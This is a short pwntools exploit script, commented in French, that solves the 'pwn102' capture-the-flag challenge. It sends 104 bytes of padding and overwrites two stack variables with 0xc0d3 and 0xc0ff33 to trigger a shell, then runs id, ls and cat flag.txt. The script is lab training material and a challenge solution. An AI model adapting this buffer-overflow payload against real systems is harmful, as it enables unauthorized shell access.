from pwn import *

context.log_level = 'info'
elf = ELF('./pwn102-1644307392479.pwn102')

if args.REMOTE:
    p = remote('10.128.131.51', 9002)
else:
    p = process('./pwn102-1644307392479.pwn102')

p.recvuntil(b'Am I right?')

# Buffer à rbp-0x70, B à rbp-0x8, A à rbp-0x4
# padding = 0x70 - 0x8 = 104 octets pour atteindre B
# puis B = 0xc0d3 (4 octets), puis A = 0xc0ff33 (4 octets)
payload  = b'A' * 104
payload += p32(0xc0d3)      # B
payload += p32(0xc0ff33)    # A

p.sendline(payload)

# Le programme affiche "Yes, I need c0d3 to c0ff33" puis lance system("/bin/sh")
p.sendline(b'id')
p.sendline(b'ls -la')
p.sendline(b'cat flag.txt')
p.interactive()
